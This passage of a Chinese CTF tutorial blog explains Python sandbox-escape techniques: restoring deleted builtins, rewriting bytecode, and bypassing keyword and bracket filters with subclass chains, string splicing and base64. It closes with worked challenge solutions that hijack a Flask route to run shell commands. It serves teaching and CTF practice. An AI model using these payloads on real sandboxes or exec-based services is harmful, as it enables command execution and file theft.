<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)  #Linux系统下默认路径</span><br><span class="line">&gt;&gt;&gt; system(&#39;whoami&#39;)</span><br><span class="line">misaki</span><br></pre></td></tr></table></figure>
<p>python3可以利用读取文件，配合exec来执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f &#x3D; open(r&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;)</span><br><span class="line">&gt;&gt;&gt; exec(f.read())</span><br><span class="line">&gt;&gt;&gt; system(&#39;whoami&#39;)</span><br><span class="line">misaki</span><br></pre></td></tr></table></figure>
<p>#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作<br>exec(“open(‘/usr/lib/python3.6/os.py’,’r’).read()”)<br>使用with open的形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f:</span><br><span class="line">...     exec(f.read())</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; system(&#39;whoami&#39;)</span><br><span class="line">misaki</span><br></pre></td></tr></table></figure>
<p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">exec</span>(<span class="string">'imp'</span>+<span class="string">'ort'</span>+<span class="string">' '</span>+<span class="string">'os;'</span>+<span class="string">'os.system("whoami")'</span>)</span><br><span class="line">misaki\user</span><br></pre></td></tr></table></figure>

<h1 id="builtin"><a href="#builtin" class="headerlink" title="builtin"></a>builtin</h1><p>在python中,我们知道,不用引入直接使用的内置函数称为 builtin 函数,随着<code>__builtin__</code>这一个module 自动被引入到环境中<br>(在python3.x 版本中,<code>__builtin__</code>变成了builtins,而且需要引入)</p>
<p>因此,open(),int(),chr()这些函数,就相当于</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.open()</span><br><span class="line">__builtin__.int()</span><br><span class="line">__builtin__.chr()</span><br></pre></td></tr></table></figure>
<p>如果我们把这些函数从<strong>builtin</strong>中删除,那么就不能够再直接使用了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import __builtin__</span><br><span class="line">&gt;&gt;&gt; del __builtin__.chr</span><br><span class="line">&gt;&gt;&gt; chr(1)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#39;chr&#39; is not defined</span><br></pre></td></tr></table></figure>
<p>同样,刚才的<code>__import__</code>函数,同样也是一个builtin函数,同样,常用的危险函数eval,exec,execfile也是<code>__builtin__</code>的,因此只要从<code>__builtin__</code>中删除这些东西,那么就不能再去使用了    </p>
<p><code>__builtin__</code>和 <code>__builtins__</code>之间是什么关系呢？</p>
<p>1、在主模块main中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。   </p>
<p>2、非主模块main中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p>
<p>*<em>解决办法: *</em></p>
<p><code>__builtins__</code>是一个默认引入的module<br>对于模块,有一个函数reload用于重新从文件系统中的代码来载入模块</p>
<p>因此我们只需要</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)</span><br></pre></td></tr></table></figure>
<p>就可以重新得到完整的<code>__builtins__</code>模块了</p>
<p>但是,reload也是<code>__builtins__</code>下面的函数,如果直接把它干掉,就没办法重新引入了  </p>
<p>但可以使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtins__)</span><br></pre></td></tr></table></figure>
<h1 id="其他特殊函数"><a href="#其他特殊函数" class="headerlink" title="其他特殊函数"></a>其他特殊函数</h1><p>通过上面的一些绕过姿势我们发现，无外乎是利用 subclasses 中的一些特殊的方法或者模块然后来调用一些函数或者模块来读取文件，或者执行命令，那么我们可以遍历所有的系统库，然后找到所有的使用了os等模块的模块，然后遍历 subclasses 列表，找到所有可以绕过的姿势<br>查找方式，详情可看此篇文章<br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">Python沙箱逃逸总结</a></p>
<h1 id="OpCode"><a href="#OpCode" class="headerlink" title="OpCode"></a>OpCode</h1><p><a href="https://xz.aliyun.com/t/6159" target="_blank" rel="noopener">利用OpCode绕过Python沙箱</a>    </p>
<p>opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"flag&#123;****&#125;"</span>)</span><br><span class="line">opcode=a.__code__.co_code.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Opcode of a():"</span>,opcode</span><br><span class="line"><span class="keyword">print</span> dis.dis(opcode.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
<p>result: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Opcode of a(): 6401006402006b020072140064030047486e000064000053</span><br><span class="line">          0 LOAD_CONST          1 (1)</span><br><span class="line">          3 LOAD_CONST          2 (2)</span><br><span class="line">          6 COMPARE_OP          2 (&#x3D;&#x3D;)</span><br><span class="line">          9 POP_JUMP_IF_FALSE    20</span><br><span class="line">         12 LOAD_CONST          3 (3)</span><br><span class="line">         15 PRINT_ITEM     </span><br><span class="line">         16 PRINT_NEWLINE  </span><br><span class="line">         17 JUMP_FORWARD        0 (to 20)</span><br><span class="line">    &gt;&gt;   20 LOAD_CONST          0 (0)</span><br><span class="line">         23 RETURN_VALUE</span><br></pre></td></tr></table></figure>
<p>为了进一步研究OpCode，我们可以对dis的disassemble_string函数进行patch</p>
<p>在124行加入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> hex(op).ljust(<span class="number">6</span>),</span><br></pre></td></tr></table></figure>
<p>可以查看具体的字节码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Opcode of a(): 6401006402006b020072140064030047486e000064000053</span><br><span class="line">          0 LOAD_CONST      0x64       1 (1)</span><br><span class="line">          3 LOAD_CONST      0x64       2 (2)</span><br><span class="line">          6 COMPARE_OP      0x6b       2 (&#x3D;&#x3D;)</span><br><span class="line">          9 POP_JUMP_IF_FALSE 0x72      20</span><br><span class="line">         12 LOAD_CONST      0x64       3 (3)</span><br><span class="line">         15 PRINT_ITEM      0x47  </span><br><span class="line">         16 PRINT_NEWLINE   0x48  </span><br><span class="line">         17 JUMP_FORWARD    0x6e       0 (to 20)</span><br><span class="line">    &gt;&gt;   20 LOAD_CONST      0x64       0 (0)</span><br><span class="line">         23 RETURN_VALUE    0x53</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>指令名</th>
<th>操作</th>
</tr>
</thead>
<tbody><tr>
<td>LOAD_GLOBAL</td>
<td>读取全局变量</td>
</tr>
<tr>
<td>STORE_GLOBAL</td>
<td>给全局变量赋值</td>
</tr>
<tr>
<td>LOAD_FAST</td>
<td>读取局部变量</td>
</tr>
<tr>
<td>STORE_FAST</td>
<td>给局部变量赋值</td>
</tr>
<tr>
<td>LOAD_CONST</td>
<td>读取常量</td>
</tr>
<tr>
<td>POP_JUMP_IF_FALSE</td>
<td>当条件为假的时候跳转</td>
</tr>
<tr>
<td>JUMP_FORWARD</td>
<td>直接跳转</td>
</tr>
</tbody></table>
<p><strong>例题 1</strong> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">"flag&#123;****&#125;"</span>)</span><br></pre></td></tr></table></figure>
<p>sulution1<br>直接获取<code>a.__code__.co_consts</code>，查看所有的常量。即可知道flag  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(None, 1, 2, &#39;flag&#123;****&#125;&#39;)</span><br></pre></td></tr></table></figure>
<p>sulution2<br>更改程序运行逻辑<br>CodeType构造函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self, argcount, nlocals, stacksize, flags, code,</span><br><span class="line">                   consts, names, varnames, filename, name, </span><br><span class="line">                   firstlineno, lnotab, freevars&#x3D;None, cellvars&#x3D;None):</span><br></pre></td></tr></table></figure>
<p>上述函数其余参数均可通过<code>__code.__.co_xxx</code>获得<br>因此我们</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def a():</span><br><span class="line">    if 1 &#x3D;&#x3D; 2:</span><br><span class="line">        print(&quot;flag&#123;****&#125;&quot;)</span><br><span class="line"></span><br><span class="line">for name in dir(a.__code__):</span><br><span class="line">    print name,getattr(a.__code__,name)</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">co_argcount 0</span><br><span class="line">co_cellvars ()</span><br><span class="line">co_code ddkrdGHndS</span><br><span class="line">co_consts (None, 1, 2, &#39;flag&#123;****&#125;&#39;)</span><br><span class="line">co_filename example1.py</span><br><span class="line">co_firstlineno 1</span><br><span class="line">co_flags 67</span><br><span class="line">co_freevars ()</span><br><span class="line">co_lnotab </span><br><span class="line"></span><br><span class="line">co_name a</span><br><span class="line">co_names ()</span><br><span class="line">co_nlocals 0</span><br><span class="line">co_stacksize 2</span><br><span class="line">co_varnames ()</span><br></pre></td></tr></table></figure>
<p>构造相应目标代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def a():</span><br><span class="line">    if 1 !&#x3D; 2:</span><br><span class="line">        print(&quot;flag&#123;****&#125;&quot;)</span><br><span class="line"></span><br><span class="line">print &quot;Opcode of a():&quot;,a.__code__.co_code.encode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure>
<p>得到code</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6401006402006b030072140064030047486e000064000053</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def a():</span><br><span class="line">    if 1 &#x3D;&#x3D; 2:</span><br><span class="line">        print(&quot;flag&#123;****&#125;&quot;)</span><br><span class="line"></span><br><span class="line">newcode &#x3D; type(a.__code__)</span><br><span class="line">code &#x3D; &quot;6401006402006b030072140064030047486e000064000053&quot;.decode(&#39;hex&#39;)</span><br><span class="line">code &#x3D; newcode(0,0,2,67,code,(None, 1, 2, &#39;flag&#123;****&#125;&#39;),(),(),&quot;xxx&quot;,&quot;a&quot;,1,&quot;&quot;)</span><br><span class="line">a.__code__ &#x3D; code</span><br><span class="line"></span><br><span class="line">a()</span><br></pre></td></tr></table></figure>
<p>即可输出flag</p>
<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="过滤-globals"><a href="#过滤-globals" class="headerlink" title="过滤__globals__"></a>过滤<code>__globals__</code></h2><p>当<code>__globals__</code>被禁用时，</p>
<ul>
<li>可以用func_globals直接替换；</li>
<li>使用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原型是调用__globals__</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果过滤了__globals__，可直接替换为func_globals</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="comment"># 也可以通过拼接字符串得到方式绕过</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">"__glo"</span>+<span class="string">"bals__"</span>)[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="过滤global"><a href="#过滤global" class="headerlink" title="过滤global"></a>过滤global</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&quot;ls&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2>对关键字进行base64编码可绕过一些明文检测机制：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">'__import__'</span>)</span><br><span class="line"><span class="string">'X19pbXBvcnRfXw=='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">'os'</span>)</span><br><span class="line"><span class="string">'b3M='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="reload-方法"><a href="#reload-方法" class="headerlink" title="reload()方法"></a>reload()方法</h2><p>某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">'eval'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval</span><br></pre></td></tr></table></figure>
<h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__bu&#39;+&#39;iltins__&#39;][&#39;__impor&#39;+&#39;t__&#39;](&#39;o&#39;+&#39;s&#39;).system(&#39;ca&#39;+&#39;lc&#39;)</span><br></pre></td></tr></table></figure>
<h2 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h2><p>当中括号[]被过滤掉时，</p>
<ul>
<li>调用<code>__getitem__()</code>函数直接替换；</li>
<li>调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原型</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__()替换中括号[]</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__getitem__(<span class="string">'__builtins__'</span>).__getitem__(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()替换中括号[]，结合__getitem__()利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.pop(<span class="string">'__builtins__'</span>).pop(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>

<h1 id="ctf例题"><a href="#ctf例题" class="headerlink" title="ctf例题"></a>ctf例题</h1><h2 id="examp1"><a href="#examp1" class="headerlink" title="examp1"></a>examp1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">banned = [</span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">print(targets)</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">        data = raw_input()</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">                print(<span class="string">"No bueno"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">            <span class="keyword">exec</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"error"</span>)</span><br></pre></td></tr></table></figure>
<p>这道题目运行在python2.7的环境，虽然没有删除reload，但是利用了黑名单机制，即使你重新载入builtins，也不能成功使用删除的危险函数。<br>file 文件读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./flag.txt'</span>).read()</span><br><span class="line"><span class="comment"># 等价于 open('test.py').read()</span></span><br></pre></td></tr></table></figure>
<p>调用其他类中的OS模块完成命令执行 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class <span class="string">'warnings.catch_warnings'</span></span><br><span class="line"><span class="comment"># 在这个类中，调用了os模块，我们可以间接把os模块调用进来。</span></span><br><span class="line"><span class="comment"># win 32</span></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[54]</span><br><span class="line"><span class="comment"># linux 2</span></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59]</span><br><span class="line"><span class="comment"># linux 2 </span></span><br><span class="line"><span class="built_in">print</span>(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:返回一个包含函数全局变量的字典引用；</span></span><br></pre></td></tr></table></figure>

<h2 id="examp2"><a href="#examp2" class="headerlink" title="examp2"></a>examp2</h2><p>pysandbox SCTF2020</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span><span class="params">()</span>:</span></span><br><span class="line">    secret = request.form[<span class="string">"cmd"</span>]</span><br><span class="line">    print(secret)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br><span class="line"></span><br><span class="line">    exec(secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"xXXxXXx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure>
<p>solution1:     </p>
<p>置静态目录的做法  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?POST&#x3D;%2f</span><br><span class="line"></span><br><span class="line">cmd&#x3D;app.static_folder&#x3D;request.args[request.method]</span><br></pre></td></tr></table></figure>
<p>设置静态目录为/<br>之后即可访问static/flag<br><img src="../../images/python/sandbox/2.png" alt=""></p>
<p>solution2:<br><code>__builtins__</code>是python的内建函数的内建命名空间，dir看一下有ord </p>
<p>将其改写为lambda匿名函数，先覆盖ord，让其返回42-122之间的数即可，确保不会error</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#39;ord&#39;] &#x3D; lambda args:42</span><br></pre></td></tr></table></figure>
<p>但是过滤了空格和引号，空格可以用 <code>*args</code> 代替。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post &#x2F;  </span><br><span class="line"></span><br><span class="line">__builtins__.ord&#x3D;lambda*args:45</span><br></pre></td></tr></table></figure>
<p>然后再将路由函数覆盖掉    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post /</span><br><span class="line"></span><br><span class="line">cmd=app.view_functions[<span class="string">'security'</span>] = <span class="keyword">lambda</span>: __import__(<span class="string">'os'</span>).popen(<span class="string">'cat ./flag'</span>).read()</span><br></pre></td></tr></table></figure>

